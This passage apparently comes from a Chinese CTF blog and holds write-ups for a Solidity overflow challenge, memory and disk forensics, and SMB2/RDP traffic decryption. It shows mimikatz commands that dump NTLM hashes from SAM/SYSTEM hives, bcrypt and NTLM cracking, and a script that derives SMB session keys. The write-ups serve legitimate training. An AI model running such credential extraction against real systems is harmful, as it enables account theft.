out!&quot;);</span><br><span class="line">        require(uint160(msg.sender) % (16*16) == 239, &quot;Sometimes I ask myself, who am i?&quot;);</span><br><span class="line">        balance[msg.sender] -= amount;</span><br><span class="line">        balance[to] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function check() public &#123;</span><br><span class="line">        require(balance[msg.sender] == 114514);</span><br><span class="line">        solve=true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        return solve;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先来看合约代码。Get函数为初始化balance为50，check函数为检查余额是否为114514，当余额为114514时，isSolved函数返回true。</p><p>主要是Transfer函数，用于向某个地址转账，但这里做了一系列的限制。要求转账金额、转账前余额、转账后余额都大于0，另外要求当前发起转账的用户地址后两位为ef。</p><p>这里有两个考点，一个是整数溢出，我们可以注意到solidity版本为0.7.0，balance和amount的类型都为uint256，即数据大小在0~2**256之间。代码中有balance[msg.sender] - amount &gt; 0的要求，但是如果amount &gt; balance[msg.sender]，那么会发生什么？显然值并不会变为负数，这里值会直接变成2**256 - amount + balance[msg.sender]。因此，我们只要使amount的值为2**256-114514+50即可。这里其实有些师傅是想复杂了。</p><p>另外一个考点其实是虚荣地址（vanity address），也就是后来给的hint中所指的。虚荣地址就是用户自己生成的具有某一特殊组合的地址，google一下其实不难找到有一个在线网站<a href="https://vanity-eth.tk/%E5%8F%AF%E4%BB%A5%E7%94%9F%E6%88%90%E8%99%9A%E8%8D%A3%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%A6%82%E4%B8%8B%E5%9B%BE%E6%89%80%E7%A4%BA%E3%80%82">https://vanity-eth.tk/可以生成虚荣地址，如下图所示。</a></p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638728-327e8e05-2164-421e-b8c2-81309a7811f7.png" alt="img"></p><p>  但其实自己或者让GPT帮忙搓一个脚本其实也不难（出题人问GPT一次就成功了）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> eth_account <span class="keyword">import</span> Account</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_address_ending_with_ef</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        private_key = <span class="string">&#x27;0x&#x27;</span> + secrets.token_hex(<span class="number">32</span>)</span><br><span class="line">        account = Account.from_key(private_key)</span><br><span class="line">        address = account.address</span><br><span class="line">        <span class="keyword">if</span> address.endswith(<span class="string">&#x27;ef&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> private_key, address</span><br><span class="line">private_key, address = find_address_ending_with_ef()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Private Key: <span class="subst">&#123;private_key&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Address: <span class="subst">&#123;address&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>接下来导入私钥就可以用了。</p><p>先get</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638944-325a6559-7d5c-4154-8f44-d22f7e27c3c7.png" alt="img"></p><p>然后transact，to的地址随便填就行</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638960-23d069d1-2007-4f70-9ffb-c17ea52de29c.png" alt="img"></p><p>再check，可以看到isSolved返回了true</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130639090-ebecaa01-9f1c-494e-901d-6387685072fe.png" alt="img"></p><p>拿到flag</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130639424-f594014e-b307-47db-ae07-36214572457e.png" alt="img"></p><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="画画的baby"><a href="#画画的baby" class="headerlink" title="画画的baby"></a>画画的baby</h3><p>附件给了一个内存文件，本题直接用volatility2或volatility3都能完成</p><p>volatility2：</p><p>先找到内存的profile：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f painting.raw imageinfo</span><br></pre></td></tr></table></figure><p>之后经过一些尝试，在查看进程的时候可以发现有一个<code>mspaint.exe</code>的进程，查阅资料可以知道这是windows自带的一个画图软件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f painting.raw --profile=Win10x64_19041 pslist</span><br><span class="line">......</span><br><span class="line">0xffffe70970c0c340 mspaint.exe            5372   3912      7        0      1      0 2024-09-06 14:36:00 UTC+0000</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>把对应的进程提取到当前目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f painting.raw --profile=Win10x64_19041 memdump -p 3912 -D ./</span><br></pre></td></tr></table></figure><p>改后缀为<code>.data</code>，再用gimp打开调调宽高和位移就能看到当时的画：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638260-0f5f65e1-33f1-4fb8-be8e-7e4d29b0c1ab.png" alt="img"></p><p>volatility3:</p><p>操作其实都差不多，不过volatility3不需要指定windows的profile：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f painting.raw windows.pslist</span><br><span class="line">......</span><br><span class="line">5372    3912    mspaint.exe     0xe70970c0c340  7       -       1       False   2024-09-06 14:36:00.000000      N/A     Disabled</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>再把进程提取到当前目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f painting.raw windows.memmap --pid 5372 --dump</span><br></pre></td></tr></table></figure><p>gimp调位移和宽高：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638768-b236d4dc-31cf-48b1-9f8a-c25f92b01f43.png" alt="img"></p><p>实际上，这几题如果用取证大师软件自动取证的话会方便许多，但出题人的预期是希望大家也能了解了解如何手动去进行这些取证，因此下面会放取证大师和手动取证两种做法。当然手动取证除了下面给出的方法以外还有很多，欢迎师傅们前来探讨。</p><h3 id="FBI-Open-The-Door-1"><a href="#FBI-Open-The-Door-1" class="headerlink" title="FBI Open The Door!! 1*"></a>FBI Open The Door!! 1*</h3><blockquote><p>实际上，这几题如果用取证大师软件自动取证的话会方便许多，但出题人的预期是希望大家也能了解了解如何手动去进行这些取证，因此下面会放取证大师和手动取证两种做法。当然手动取证除了下面给出的方法以外还有很多，欢迎师傅们前来探讨。</p></blockquote><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644424-a5f29b98-5285-4776-8008-70a6ff866431.png" alt="img"></p><p>将检材下载下来求一下SHA256校验值即可</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644383-8db2fe63-3e4d-4480-a4c9-0a65180fc34c.png" alt="img"></p><p>0xGame{6d393b09ac01accf27bce07a9c07f5721b9e1e1fd5de1cc8cc1a2581a43e68f5}</p><h3 id="FBI-Open-The-Door-2"><a href="#FBI-Open-The-Door-2" class="headerlink" title="FBI Open The Door!! 2*"></a>FBI Open The Door!! 2*</h3><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644457-004db25d-16f6-4d8d-8f42-60ad7bc34975.png" alt="img"></p><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>取证大师一把梭</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644587-a13ec229-1b63-402a-9c66-7e8b1699bab8.png" alt="img"></p><p>0xGame{F1sh1ng-s3v3r}</p><h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>使用FTK Imager打开：file–&gt;Add Evidence Item–&gt;Image File–&gt;Browse选择文件–&gt;Finish</p><p>在C:\Windows\System32\winevt\Logs路径下找到系统日志system.evtx </p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644955-c86b739b-09d8-4cb9-85ae-598e9ba37364.png" alt="img"></p><p>打开日志文件，查看事件ID为6011的日志，发现有一条修改主机名的记录，得到主机名</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644949-c913143e-9bb0-4a8b-b64f-b09722b9b40c.png" alt="img"></p><p>0xGame{F1sh1ng-s3v3r}</p><h3 id="FBI-Open-The-Door-3"><a href="#FBI-Open-The-Door-3" class="headerlink" title="FBI Open The Door!! 3*"></a>FBI Open The Door!! 3*</h3><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805645036-1162dc1d-5338-4541-944c-92d54a394d7c.png" alt="img"></p><h4 id="法一-1"><a href="#法一-1" class="headerlink" title="法一"></a>法一</h4><p>取证大师可以直接梭出用户St5rr的NTLM hash</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644951-7dacc63c-5453-4859-b50f-90cd69df1225.png" alt="img"></p><p>cmd5上查一下就有</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805645161-02a54f7a-e6c8-460d-87a9-ccd73b41ada9.png" alt="img"></p><p>0xGame{zaq!xsw@}</p><h4 id="法二-1"><a href="#法二-1" class="headerlink" title="法二"></a>法二</h4><p>用ftk，在C:\Windows\System32\config下找到SYSTEM和SAM两个文件，导出</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805645524-1f1b45f0-56ca-41f7-82f9-adf7dc9b9922.png" alt="img"></p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805645572-a6b82b41-3ca7-45a3-81dd-015d6c4a93c2.png" alt="img"></p><p>接下来使用一个叫作<a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>的工具提取NTLM Hash。</p><p>运行的时候记得以管理员权限运行，然后依次运行下面两行神奇命令就能得到用户的NTLM Hash。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::sam /sam:SAM /system:SYSTEM</span><br></pre></td></tr></table></figure><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805645600-dfd01aaa-fe3f-49ec-baed-cb2db86992ba.png" alt="img"></p><p>查cmd5</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805645588-e179f20c-9aa3-47c7-876a-706c5b93fff7.png" alt="img"></p><p>0xGame{zaq!xsw@}</p><h3 id="FBI-Open-The-Door-4"><a href="#FBI-Open-The-Door-4" class="headerlink" title="FBI Open The Door!! 4*"></a>FBI Open The Door!! 4*</h3><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805645621-1c89dc55-624d-4dfa-bc08-e5981a7a1c49.png" alt="img"></p><h4 id="法一-2"><a href="#法一-2" class="headerlink" title="法一"></a>法一</h4><p>取证大师一把梭</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646098-7ea3410c-3834-4fca-ae3a-2cd0e90ecd5d.png" alt="img"></p><p>0xGame{2024-10-23 14:50:40}</p><h4 id="法二-2"><a href="#法二-2" class="headerlink" title="法二"></a>法二</h4><p>用ftk，在C:\Windows\System32\config下找到SOFTWARE，导出</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646126-93c4cf47-8e2a-4b30-9df9-6794d706d54c.png" alt="img"></p><p>用kali自带的chntpw查看，用下面的两条奇妙命令即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chntpw -e SOFTWARE</span><br><span class="line">ls Microsoft\Windows NT\CurrentVersion</span><br></pre></td></tr></table></figure><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646207-1cd1c29a-eb21-446c-a849-167c74cfba77.png" alt="img"></p><p>可以看到InstallDate，是以时间戳的形式表示的，使用<a href="https://tool.lu/timestamp/">在线工具</a>进行转换，得到系统安装时间</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646152-98b761fc-391b-4b82-b6d4-c5bc203d4450.png" alt="img"></p><p>0xGame{2024-10-23 14:50:40}</p><h3 id="FBI-Open-The-Door-5"><a href="#FBI-Open-The-Door-5" class="headerlink" title="FBI Open The Door!! 5*"></a>FBI Open The Door!! 5*</h3><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646135-feb24c6a-7809-48eb-a6aa-b769b132ae95.png" alt="img"></p><p>可以在C:\Windows\Temp路径下找到gophish文件夹，将其导出。取证大师中的话可以更快找到这个路径。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646972-8ee81990-54af-4552-adab-e011c4277820.png" alt="img"></p><p>在接下来的步骤前，建议去了解一下gophish</p><p>文件夹中有个gophish.db，用navicat看一下</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646866-9fc719e8-ac25-4f96-acda-6c0254776258.png" alt="img"></p><p>在smtp表中找到password字段，这就是smtp授权码</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646930-3b5e372b-2c80-42c0-9df6-5494a3c31fef.png" alt="img"></p><p>0xGame{wpdqlnyvetqyddce}</p><h3 id="FBI-Open-The-Door-6"><a href="#FBI-Open-The-Door-6" class="headerlink" title="FBI Open The Door!! 6*"></a>FBI Open The Door!! 6*</h3><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646951-f88bd439-01b0-4467-a5bd-e4aa03d7e50f.png" alt="img"></p><p>接上一题，查看users表中的hash字段，这就是登录密码的哈希</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805647059-85491922-b06f-4245-b4b3-12915db1c3a9.png" alt="img"></p><p>网上搜索一下可以知道，这是bcrypt hash，明文肯定是弱口令，用hashcat或者jtr爆破一下就行，下面用jtr。将哈希值存成一个名为1.hash的文件，字典使用rockyou.txt。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805647497-a3ab4d75-c4bc-4aa2-9172-c4b737789ed9.png" alt="img"></p><p>0xGame{qwertyuiop}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 0xGame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯2024 Misc 谍影重重5.0 Writeup</title>
      <link href="/posts/829c310c/"/>
      <url>/posts/829c310c/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这次是跟hyperion打的，除了签到题就做了这一题，另有一题跟队友合作完成，这里就不放wp了<del>（我没写）</del></p></blockquote><h2 id="谍影重重5-0"><a href="#谍影重重5-0" class="headerlink" title="谍影重重5.0"></a>谍影重重5.0</h2><p>可以看到有很多被加密的SMB2流量</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/1730805765590-1fad5624-fbad-423b-bc56-c3d2ae528739.png" alt="img"></p><p>参考<a href="https://blog.nflabs.jp/entry/2022/12/12/094816">这篇文章</a></p><p>首先把NTLM hash提取出来，这里我用NTLMRawUnHide这个工具</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/1730805765757-b609ab05-8ace-4168-8537-8e6537ba628a.png" alt="img"></p><p>用hashcat爆破出明文密码babygirl233</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/1730805765626-839aa03a-e60b-4310-8180-9293103748e8.png" alt="img"></p><p>算一下nt</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/1730805765593-3c21cc1d-db95-4b00-a1e4-f6b6a9a3074a.png" alt="img"></p><p>找到session key和ntproofstr</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/1730805766211-2a1f4c6f-5c58-4ebc-8575-b31ee2f7aa50.png" alt="img"></p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/1730805766232-ea64954f-dd65-4df9-bfdb-57dc4a2259a1.png" alt="img"></p><p>用脚本算得random sk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import hmac</span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line">#stolen from impacket. Thank you all for your wonderful contributions to the communitytry:</span><br><span class="line">    from Cryptodome.Cipher import ARC4</span><br><span class="line">    from Cryptodome.Cipher import DES</span><br><span class="line">    from Cryptodome.Hash import MD4</span><br><span class="line">except Exception:</span><br><span class="line">    LOG.critical(&quot;Warning: You don&#x27;t have any crypto installed. You need pycryptodomex&quot;)</span><br><span class="line">    LOG.critical(&quot;See https://pypi.org/project/pycryptodomex/&quot;)</span><br><span class="line"></span><br><span class="line">def generateEncryptedSessionKey(keyExchangeKey, exportedSessionKey):</span><br><span class="line">   cipher = ARC4.new(keyExchangeKey)</span><br><span class="line">   cipher_encrypt = cipher.encrypt</span><br><span class="line"></span><br><span class="line">   sessionKey = cipher_encrypt(exportedSessionKey)</span><br><span class="line">   return sessionKey</span><br><span class="line">###</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=&quot;Calculate the Random Session Key based on data from a PCAP (maybe).&quot;)</span><br><span class="line">parser.add_argument(&quot;-u&quot;,&quot;--user&quot;,required=True,help=&quot;User name&quot;)</span><br><span class="line">parser.add_argument(&quot;-d&quot;,&quot;--domain&quot;,required=True, help=&quot;Domain name&quot;)</span><br><span class="line">#parser.add_argument(&quot;-p&quot;,&quot;--password&quot;,required=True,help=&quot;Password of User&quot;)</span><br><span class="line">parser.add_argument(&quot;-H&quot;,&quot;--hash&quot;,required=True,help=&quot;NTLM hash of User&quot;)</span><br><span class="line">parser.add_argument(&quot;-n&quot;,&quot;--ntproofstr&quot;,required=True,help=&quot;NTProofStr. This can be found in PCAP (provide Hex Stream)&quot;)</span><br><span class="line">parser.add_argument(&quot;-k&quot;,&quot;--key&quot;,required=True,help=&quot;Encrypted Session Key. This can be found in PCAP (provide Hex Stream)&quot;)</span><br><span class="line">parser.add_argument(&quot;-v&quot;, &quot;--verbose&quot;, action=&quot;store_true&quot;, help=&quot;increase output verbosity&quot;)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">#Upper Case User and Domain</span><br><span class="line">user = str(args.user).upper().encode(&#x27;utf-16le&#x27;)</span><br><span class="line">domain = str(args.domain).upper().encode(&#x27;utf-16le&#x27;)</span><br><span class="line"></span><br><span class="line">#Create &#x27;NTLM&#x27; Hash of password#passw = args.password.encode(&#x27;utf-16le&#x27;)#hash1 = hashlib.new(&#x27;md4&#x27;, passw)#password = hash1.digest()</span><br><span class="line">password = args.hash.decode(&#x27;hex&#x27;)</span><br><span class="line"></span><br><span class="line">#Calculate the ResponseNTKey</span><br><span class="line">h = hmac.new(password, digestmod=hashlib.md5)</span><br><span class="line">h.update(user+domain)</span><br><span class="line">respNTKey = h.digest()</span><br><span class="line"></span><br><span class="line">#Use NTProofSTR and ResponseNTKey to calculate Key Excahnge Key</span><br><span class="line">NTproofStr = args.ntproofstr.decode(&#x27;hex&#x27;)</span><br><span class="line">h = hmac.new(respNTKey, digestmod=hashlib.md5)</span><br><span class="line">h.update(NTproofStr)</span><br><span class="line">KeyExchKey = h.digest()</span><br><span class="line"></span><br><span class="line">#Calculate the Random Session Key by decrypting Encrypted Session Key with Key Exchange Key via RC4</span><br><span class="line">RsessKey = generateEncryptedSessionKey(KeyExchKey,args.key.decode(&#x27;hex&#x27;))</span><br><span class="line"></span><br><span class="line">if args.verbose:</span><br><span class="line">    print &quot;USER WORK: &quot; + user + &quot;&quot; + domain</span><br><span class="line">    print &quot;PASS HASH: &quot; + password.encode(&#x27;hex&#x27;)</span><br><span class="line">    print &quot;RESP NT:   &quot; + respNTKey.encode(&#x27;hex&#x27;)</span><br><span class="line">    print &quot;NT PROOF:  &quot; + NTproofStr.encode(&#x27;hex&#x27;)</span><br><span class="line">    print &quot;KeyExKey:  &quot; + KeyExchKey.encode(&#x27;hex&#x27;)    </span><br><span class="line">print &quot;Random SK: &quot; + RsessKey.encode(&#x27;hex&#x27;)</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/1730805766582-1bce6541-8386-45c9-9760-36039876d46a.png" alt="img"></p><p>再找到session id，以大端序排列，在wireshark中导入，解密smb2流量</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/1730805766404-fc9ad449-b288-49c4-8fa4-546edf2eba15.png" alt="img"></p><p>导出smb2传输的文件，一个需要密码的flag.7z，还有远程桌面连接的私钥文件LOCAL_MACHINE_Remote_Desktop_0_DESKTOP-J0EE9MR.pfx</p><p>接下来是解密RDP流量，其中pfx需要密码，经过查询不难猜得这里的密码是mimikatz，成功解密RDP流量</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/1730805766346-65ab08d5-1af7-4ebf-964a-b449e4ccce11.png" alt="img"></p><p>后面也许有更好的办法，但这里我是手动提取的。</p><p>用rdp.fastpath.scancode.keycode过滤出记录了按键的流量</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/1730805766947-5e0204f8-bdeb-4e5f-9729-df08598b8c7d.png" alt="img"></p><p>展开下面的RDP，可以看到每个流都记录了一个keycode</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/1730805766930-ade97052-ebc8-4584-904b-55bd506cccdd.png" alt="img"></p><p>这里我手动把每一个keycode提取了出来，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x1c 0x14 0x23 0x12 0x2a 0x39 0x08 0x2c 0x39 0x19 0x1e 0x1f 0x1f 0x11 0x18 0x13 0x20 0x39 0x17 0x1f 0x39 0x21 0x28 0x2a 0x1a 0x11 0x17 0x31 0x20 0x18 0x11 0x1f 0x2a 0x0c 0x19 0x1e 0x1f 0x1f 0x11 0x18 0x13 0x20 0x2a 0x1b 0x0a 0x04 0x05 0x08 0x0b 0x02 0x04 0x02 0x09 0x03 0x28 0x1d 0x1f</span><br></pre></td></tr></table></figure><p>将其转换成对应的按键，去除一些行为艺术的按键，可以得到如下一句话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">the 7z password is windowspassword9347013182</span><br></pre></td></tr></table></figure><p>因此密码就是babygirl2339347013182，解压得flag</p><p>flag{fa32a0b2-dc26-41f9-a5cc-1a48ca7b2ddd}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> 强网杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BuildCTF2024 Writeup</title>
      <link href="/posts/f0c8bac7/"/>
      <url>/posts/f0c8bac7/</url>
      
        <content type="html"><![CDATA[<p>花了一晚上简单看了看，一眼看不出来的就没做，所以就做了这么点题，wp比较潦草。。。</p><h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/BuildCTF2024Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> BuildCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网拟态2024 初赛Misc Writeup+复现</title>
      <link href="/posts/420d4aeb/"/>
      <url>/posts/420d4aeb/</url>
      
        <content type="html"><![CDATA[<h2 id="Writeup部分"><a href="#Writeup部分" class="headerlink" title="Writeup部分"></a>Writeup部分</h2><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Xor"><a href="#Xor" class="headerlink" title="Xor"></a>Xor</h4><p>签到题</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021145506092.png" alt="image-20241021145506092"></p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="ezflag"><a href="#ezflag" class="headerlink" title="ezflag"></a>ezflag</h4><p>追踪一下tcp流，一眼看到pk，得知是传了一个压缩包，提取出来</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021153738034.png" alt="image-20241021153738034"></p><p>解压出来的flag.zip没法解压，丢进010看一下，发现这其实是个png</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021153943922.png" alt="image-20241021153943922"></p><p>改后缀名为.png即可看到flag</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021154025231.png" alt="image-20241021154025231"></p><h4 id="Pvz"><a href="#Pvz" class="headerlink" title="Pvz"></a>Pvz</h4><p>提示说压缩包密码是pvz图中消耗阳光数的md5值，懒得去算，直接爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> pyzipper</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_hash</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(<span class="built_in">str</span>(number).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_passwords</span>(<span class="params">zip_file_path, start, end,tar</span>):</span><br><span class="line">    <span class="keyword">with</span> pyzipper.AESZipFile(zip_file_path, <span class="string">&#x27;r&#x27;</span>, compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) <span class="keyword">as</span> zip_ref:</span><br><span class="line">        <span class="keyword">for</span> number <span class="keyword">in</span> <span class="built_in">range</span>(start, end + <span class="number">1</span>):</span><br><span class="line">            password = md5_hash(number)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                zip_ref.extractall(path=tar,pwd=password.encode())</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;成功找到密码: <span 